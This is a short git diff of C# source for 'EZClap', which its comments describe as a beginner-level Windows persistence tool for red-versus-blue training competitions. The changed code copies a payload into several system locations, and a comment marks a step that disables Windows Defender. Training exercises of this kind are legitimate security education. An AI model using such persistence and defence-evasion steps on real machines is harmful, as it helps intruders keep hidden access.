@@ -4,7 +4,8 @@ using System.Collections.Specialized;
 using System.Collections.Generic;
 using Microsoft.Win32;
 
-/*  Name: EZClap 
+/*
+ *  Name: EZClap 
  *  Description: EZClap is a Windows Userland persistence tool which was created for educational purposes in 
  *  Red vs. Blue team competitions. As the tool is targetted towards beginners in Windows Security, most of the 
  *  mechanisms are easy to detect through usage of sysinternal tools or simple cmd/powershell commands.
@@ -54,11 +55,9 @@ namespace ezclap
             //Console.WriteLine(RegistryKeys.hklmImagePath);
 
             // 3. Copy payload into different locations 
-            List<string> payloadList = new List<string>();
             foreach (var destination in newLoc)
             {
                 System.IO.File.Copy(originPayloadLoc, destination, true);
-                payloadList.Add(destination);
             }
 
             // 4. Disable WinDefender - Temp 
